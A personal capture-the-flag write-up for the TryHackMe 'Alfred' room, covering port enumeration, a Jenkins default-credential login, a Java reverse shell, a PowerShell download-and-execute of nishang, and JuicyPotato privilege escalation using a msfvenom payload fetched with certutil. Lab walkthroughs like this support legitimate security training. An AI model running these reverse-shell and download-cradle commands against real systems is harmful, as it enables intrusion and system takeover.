# Enumeration 

## open ports


```
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:C9:B3:7C:AA:F3 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Port 80

![[Pasted image 20230119060137.png]]
Nothing much
### port 8080
![[Pasted image 20230119060149.png]]


trying default admin:admin and worked


# Foothold 

![[Pasted image 20230119064423.png]]
```

String host="10.10.214.71";
int port=9001;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

uploading nishang and using it to get more stable shell
`powershell "IEX(new-object net.webclient).downloadstring('http://10.10.214.71:8000/shell.ps1')" `

# Privesc 

whoami /priv
![[Pasted image 20230119065340.png]]
potato time

On attacker:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.214.71 LPORT=4005 -f exe -o reverse.exe
mv reverse.exe rev.exe
nc -lvnp 4005
```

On target:

```
certutil -urlcache -f http://10.10.214.71:8000/rev.exe rev.exe
certutil -urlcache -f http://10.10.214.71:8000/jp.exe jp.exe
.\jp.exe -t * -p rev.exe -l 9257
```

![[Pasted image 20230119065823.png]]

![[Pasted image 20230119070613.png]]
# Loot

Jenkins creds:
	Username:admin
	Password:admin


---
Tags: #ctf #thm #Token_impersonation #potato #jenkins 
Resources: [Alfred](https://tryhackme.com/room/alfred)